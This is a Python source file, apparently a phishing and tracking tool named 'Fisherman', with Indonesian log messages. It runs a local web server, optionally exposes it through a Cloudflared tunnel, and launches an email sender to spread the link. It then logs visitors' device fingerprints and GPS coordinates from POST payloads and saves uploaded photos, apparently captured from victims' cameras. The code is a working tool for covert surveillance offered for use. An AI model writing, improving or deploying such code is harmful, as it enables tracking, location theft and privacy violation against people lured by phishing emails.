#!/usr/bin/env python3
import http.server
import socketserver
import subprocess
import os
import time
import signal
import sys
import platform
from datetime import datetime
from urllib.parse import urlparse
from shutil import which
import logging
from logging.handlers import RotatingFileHandler
import threading
import json
import warnings

# Menekan semua warning deprecation
warnings.simplefilter("ignore", DeprecationWarning)

import cgi

PORT = 8080
FOLDER_NAME = "server"
CLEAR_COMMAND = "clear" if os.name == "posix" else "cls"
LOG_FILENAME = "tracker.log"
MAX_LOG_BYTES = 5 * 1024 * 1024
BACKUP_COUNT = 3

httpd = None

def clear_screen():
    try:
        os.system(CLEAR_COMMAND)
    except Exception:
        pass

def print_banner():
    print("=" * 40)
    print("           Fisherman                  ")
    print("           By: BangAguse              ")
    print("=" * 40)
try:
    import colorama
    colorama.init()
    F_RESET = colorama.Style.RESET_ALL
    F_RED = colorama.Fore.RED
    F_GREEN = colorama.Fore.GREEN
    F_YELLOW = colorama.Fore.YELLOW
    F_CYAN = colorama.Fore.CYAN
    F_BLUE = colorama.Fore.BLUE
except Exception:
    F_RESET = "\033[0m"
    F_RED = "\033[31m"
    F_GREEN = "\033[32m"
    F_YELLOW = "\033[33m"
    F_CYAN = "\033[36m"
    F_BLUE = "\033[34m"

def colored(text, color_code):
    try:
        return f"{color_code}{text}{F_RESET}"
    except Exception:
        return text

def check_network_delay():
    try:
        result = subprocess.run(['ping', '-c', '1', 'google.com'], capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            for line in result.stdout.split('\n'):
                if 'time=' in line:
                    time_str = line.split('time=')[1].split(' ')[0]
                    delay = float(time_str)
                    if delay < 50:
                        return 2.0
                    elif delay < 150:
                        return 3.0
                    else:
                        return 8.0 
        return 2.0 
    except:
        return 2.0

def print_ascii_tracker():
    art = '''
░▒▓████████▓▒░▒▓█▓▒░░▒▓███████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░░▒▓██████████████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░  
░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓██████▓▒░ ░▒▓█▓▒░░▒▓██████▓▒░░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
    
𝕍𝕖𝕣𝕤𝕚𝕠𝕟: 𝟙.𝟚.𝟘
ℂ𝕣𝕖𝕒𝕥𝕠𝕣: 𝔹𝕒𝕟𝕘𝔸𝕘𝕦𝕤𝕖
'''.splitlines()

    for line in art:
        out = []
        for ch in line:
            if ch in ('░', ' '):
                out.append(f"{F_RED}{ch}{F_RESET}")
            else:
                out.append(f"{F_YELLOW}{ch}{F_RESET}")
        print("".join(out))

def animated_loading(message="Loading", duration=3.5, interval=0.25):
    multiplier = check_network_delay()
    total_duration = duration * multiplier
    steps = 100
    bar_length = 50
    for i in range(steps + 1):
        percent = int((i / steps) * 100)
        filled = int((i / steps) * bar_length)
        bar = '█' * filled + '.' * (bar_length - filled)
        sys.stdout.write(f"\rProgress: [{percent:3}%] [{bar}] ")
        sys.stdout.flush()
        time.sleep(total_duration / steps)
    sys.stdout.write("\r" + " " * 70 + "\r")
    sys.stdout.flush()


def setup_logging(log_path):
    logger = logging.getLogger("tracker")
    logger.setLevel(logging.INFO)

    ch = logging.StreamHandler()
    ch.setLevel(logging.INFO)
    ch_formatter = logging.Formatter("%(asctime)s | %(levelname)s | %(message)s", "%Y-%m-%d %H:%M:%S")
    ch.setFormatter(ch_formatter)

    fh = RotatingFileHandler(log_path, maxBytes=MAX_LOG_BYTES, backupCount=BACKUP_COUNT, encoding="utf-8")
    fh.setLevel(logging.INFO)
    fh.setFormatter(ch_formatter)

    if not logger.handlers:
        logger.addHandler(ch)
        logger.addHandler(fh)

    return logger

def cek_folder_server():
    try:
        full_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), FOLDER_NAME)
        if not os.path.exists(full_path):
            raise FileNotFoundError(f"Folder '{FOLDER_NAME}' tidak ditemukan: {full_path}")
        os.chdir(full_path)
        return full_path
    except Exception as e:
        print(f"[X] Gagal mengakses folder server: {e}")
        sys.exit(1)

def tampilkan_info_sistem(logger):
    logger.info(f"Platform   : {platform.system()} {platform.machine()}")
    logger.info(f"Sekarang   : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    logger.info(f"Direktori  : {os.getcwd()}")
    logger.info(f"Port       : {PORT}")

class LoggingHandler(http.server.SimpleHTTPRequestHandler):
    server_version = "FishermanHTTP/1.0"

    def _log_request_full(self, note=""):
        client = f"{self.client_address[0]}:{self.client_address[1]}"
        method = self.command
        path = self.path
        parsed = urlparse(path)
        return f"{client} | {method} | {parsed.path} | query={parsed.query} {note}"

    def do_GET(self):
        logger = logging.getLogger("tracker")
        logger.info(self._log_request_full())
        try:
            super().do_GET()
        except Exception as e:
            logger.error(f"Error saat men-serv file: {e}")
            self.send_error(500, "Internal Server Error")

    def do_POST(self):
        logger = logging.getLogger("tracker")
        if self.path == '/upload':
            try:
                form = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD':'POST'})
                if 'photo' in form:
                    fileitem = form['photo']
                    if fileitem.filename:
                        filename = os.path.basename(fileitem.filename)
                        os.makedirs('uploads', exist_ok=True)
                        filepath = os.path.join('uploads', filename)
                        with open(filepath, 'wb') as f:
                            f.write(fileitem.file.read())
                        logger.info(f"Foto diterima: {filename} | Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | Path: {filepath}")
                        self.send_response(200)
                        self.send_header("Content-Type", "text/plain; charset=utf-8")
                        self.end_headers()
                        self.wfile.write(b"OK")
                    else:
                        self.send_error(400, "No file")
                else:
                    self.send_error(400, "No photo field")
            except Exception as e:
                logger.error(f"[X] Error handling upload: {e}")
                self.send_error(500)
        else:
            note = ""
            try:
                length = int(self.headers.get('Content-Length', 0))
                content_type = self.headers.get('Content-Type', '')
                data = self.rfile.read(length) if length > 0 else b""
                try:
                    decoded = data.decode('utf-8', errors='replace')
                except Exception:
                    decoded = repr(data)
                note = f"| content-type={content_type} | payload_len={len(data)}"
                logger.info(self._log_request_full(note))
                logger.info("---- BEGIN POST PAYLOAD ----")
                try:
                    payload = json.loads(decoded)
                    print_dict(payload, "", logger)
                except json.JSONDecodeError:
                    logger.info(decoded)
                logger.info("----  END POST PAYLOAD  ----")
                self.send_response(200)
                self.send_header("Content-Type", "text/plain; charset=utf-8")
                self.end_headers()
                self.wfile.write(b"OK")
            except Exception as e:
                logger.error(f"[X] Gagal menangani POST: {e}")
                try:
                    self.send_response(500)
                    self.end_headers()
                except:
                    pass

    def log_message(self, format, *args):
        return

def print_dict(d, prefix="", logger=None):
    if logger is None:
        logger = logging.getLogger("tracker")
    emoji_map = {
        "userAgent": "=",
        "language": "=",
        "platform": "=",
        "memory": "=",
        "cores": "=",
        "screen": "=",
        "width": "=",
        "height": "=",
        "availWidth": "=",
        "availHeight": "=",
        "colorDepth": "=",
        "pixelDepth": "=",
        "timezone": "=",
        "cookieEnabled": "=",
        "doNotTrack": "=",
        "referrer": "=",
        "battery": "=",
        "level": "=",
        "charging": "=",
        "location": "=",
        "lat": "=",
        "lon": "=",
        "timestamp": "=",
        "accuracy": "="
    }
    for k, v in d.items():
        emoji = emoji_map.get(k, "📄")
        if isinstance(v, dict):
            logger.info(f"{F_YELLOW}{emoji} {prefix}{k}:{F_RESET}")
            print_dict(v, prefix + "  ", logger)
        else:
            logger.info(f"{F_YELLOW}{emoji} {prefix}{k}: {v}{F_RESET}")

class ThreadingHTTPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True

def mulai_server(logger, full_path, is_cloudflared=False):
    global httpd
    try:
        os.chdir(full_path)
        with ThreadingHTTPServer(("127.0.0.1", PORT), LoggingHandler) as httpd_local:
            httpd = httpd_local
            addr = httpd.server_address
            logger.info(f"Server aktif di: http://{addr[0]}:{addr[1]}")
            logger.info("Menunggu koneksi...\n")
            if not is_cloudflared:
                email_sender_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'email_sender.py')
                subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', f'python3 "{email_sender_path}" "{f"http://{addr[0]}:{addr[1]}"}"; echo "Press Ctrl+C to exit terminal."; sleep infinity'])
            try:
                httpd.serve_forever()
            except Exception as e:
                logger.error(f"[X] Error saat serve_forever: {e}")
    except OSError as e:
        logger.error(f"[X] Port {PORT} sedang digunakan atau akses ditolak: {e}")
        sys.exit(1)
    except Exception as e:
        logger.error(f"[X] Error saat menjalankan server: {e}")
        sys.exit(1)

def handle_exit(sig, frame):
    logger = logging.getLogger("tracker")
    logger.info("\n[!] Dihentikan oleh user.")
    global httpd
    try:
        if httpd:
            logger.info("Menghentikan server...")
            threading.Thread(target=httpd.shutdown).start()
            time.sleep(0.5)
    except Exception as e:
        logger.error(f"[X] Gagal shutdown server secara rapi: {e}")
    logger.info("Semua koneksi dihentikan. Keluar dengan aman.")
    sys.exit(0)

def cek_folder_server():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    server_dir = os.path.join(script_dir, FOLDER_NAME)
    if not os.path.exists(server_dir):
        print(f"Error: Folder '{FOLDER_NAME}' tidak ditemukan di direktori script.")
        sys.exit(1)
    return server_dir

def main():
    signal.signal(signal.SIGINT, handle_exit)
    signal.signal(signal.SIGTERM, handle_exit)

    clear_screen()
    print_banner()

    full_path = cek_folder_server()

    log_path = os.path.join(full_path, LOG_FILENAME)
    logger = setup_logging(log_path)

    tampilkan_info_sistem(logger)

    try:
        while True:
            user_input = input("\nLanjutkan? [Y/N]: ").strip().lower()
            if user_input == "y":
                break
            if user_input == "n":
                logger.info("[!] Program dibatalkan oleh user.")
                sys.exit(0)
            print("Masukkan Y untuk lanjut atau N untuk berhenti.")
    except KeyboardInterrupt:
        handle_exit(None, None)

    try:
        clear_screen()
        print_ascii_tracker()
        animated_loading("Memuat pilihan...", duration=3.5)
        print("\nPilih Mode Server:")
        print("1. Localhost")
        print("2. Cloudflared Tunnel")

        mode = input("\nPilih [1/2]: ").strip()

        if mode not in ['1', '2']:
            logger.info("[!] Pilihan tidak valid. Menggunakan mode Localhost.")
            mode = '1'

        if mode == '2':
            try:
                from cloudflared_tunnel import start_cloudflared_tunnel, stop_cloudflared_tunnel
                logger.info("Mode: CLOUDFLARED TUNNEL")
                logger.info(f"Log file: {log_path}")
                logger.info("Memulai server dan tunnel...")
                animated_loading("Memulai server & tunnel...", duration=7.3)

                def handle_exit_with_tunnel(sig, frame):
                    logger = logging.getLogger("tracker")
                    logger.info("\n[!] Dihentikan oleh user (signal received).")
                    global httpd
                    try:
                        if httpd:
                            logger.info("Menghentikan server...")
                            threading.Thread(target=httpd.shutdown).start()
                            time.sleep(0.5)
                        if 'cloudflared_process' in globals():
                            logger.info("Menghentikan tunnel...")
                            stop_cloudflared_tunnel(cloudflared_process)
                    except Exception as e:
                        logger.error(f"[X] Gagal shutdown: {e}")
                    logger.info("Semua koneksi dihentikan. Keluar dengan aman.")
                    sys.exit(0)

                signal.signal(signal.SIGINT, handle_exit_with_tunnel)
                signal.signal(signal.SIGTERM, handle_exit_with_tunnel)

                server_thread = threading.Thread(target=mulai_server, args=(logger, full_path, True))
                server_thread.start()
                time.sleep(2)

                global cloudflared_process
                cloudflared_process, tunnel_url = start_cloudflared_tunnel(PORT)
                email_sender_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'email_sender.py')
                subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', f'python3 "{email_sender_path}" "{tunnel_url}"; echo "Press Ctrl+C to exit terminal."; sleep infinity'])

                server_thread.join()

            except ImportError:
                logger.error("[X] Module cloudflared_tunnel.py tidak ditemukan!")
                sys.exit(1)
        else:
            logger.info("Mode: LOCALHOST (tidak membuat tunnel external)")
            logger.info(f"Log file: {log_path}")
            logger.info("Memulai server dan logging aktivitas...")
            animated_loading("Memulai server...", duration=1.2)
            mulai_server(logger, full_path)

    except KeyboardInterrupt:
        handle_exit(None, None)

if __name__ == "__main__":
    main()
